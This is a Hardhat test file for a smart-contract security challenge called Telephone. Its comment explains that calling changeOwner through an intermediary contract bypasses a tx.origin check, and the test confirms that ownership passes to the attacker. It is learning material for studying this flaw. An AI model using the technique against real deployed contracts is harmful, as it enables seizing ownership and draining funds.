const { expect } = require("chai");
const { ethers } = require("hardhat");

/**

████████╗███████╗██╗░░░░░███████╗██████╗░██╗░░██╗░█████╗░███╗░░██╗███████╗
╚══██╔══╝██╔════╝██║░░░░░██╔════╝██╔══██╗██║░░██║██╔══██╗████╗░██║██╔════╝
░░░██║░░░█████╗░░██║░░░░░█████╗░░██████╔╝███████║██║░░██║██╔██╗██║█████╗░░
░░░██║░░░██╔══╝░░██║░░░░░██╔══╝░░██╔═══╝░██╔══██║██║░░██║██║╚████║██╔══╝░░
░░░██║░░░███████╗███████╗███████╗██║░░░░░██║░░██║╚█████╔╝██║░╚███║███████╗
░░░╚═╝░░░╚══════╝╚══════╝╚══════╝╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝╚══════╝
 
 * Goal: 
 * 
 * 1. Claim ownership of the contract
 * 2. Reduce its balance to 0
 *
 * Solution:
 *
 * by calling "changeOwner" from another contract instead of the same one,
 * it allows the function's caller control to be bypassed.
 * tx.origin is always the wallet sending the transaction,
 * while msg.sender will be the address of the attacking smart contract.
 *
 * Note:
 * 
 * If we call changeOwner directly from the contract Telephone msg.sender 
 * will be the wallet that sends the transaction, which is the same as tx.origin.
 * 
 */
describe("Telephone", function () {
    let telephone, telephoneAttacker, owner, player;

    before(async function () {
        // Contracts are deployed using the first signer/account by default
        [owner, player] = await ethers.getSigners();

        const Telephone = await ethers.getContractFactory("contracts/Telephone/Telephone.sol:Telephone");
        telephone = await Telephone.connect(owner).deploy();

        const TelephoneAttacker = await ethers.getContractFactory("contracts/Telephone/TelephoneAttacker.sol:TelephoneAttacker");
        telephoneAttacker = await TelephoneAttacker.connect(player).deploy(telephone.address);
    });

    describe("Check ownership", function () {
        it("Should have the deployer as owner", async function () {
            expect(await telephone.owner()).to.be.eq(owner.address);
            expect(await telephoneAttacker.owner()).to.be.eq(player.address);
        });
    });

    describe("Call changeOwner from contract attacker", function () {
        it("Should permit to steal the ownership", async function () {
            await telephoneAttacker.connect(player).changeOwner();

            expect(await telephone.owner()).to.be.eq(player.address); // now player is the new owner
        });
    });
});
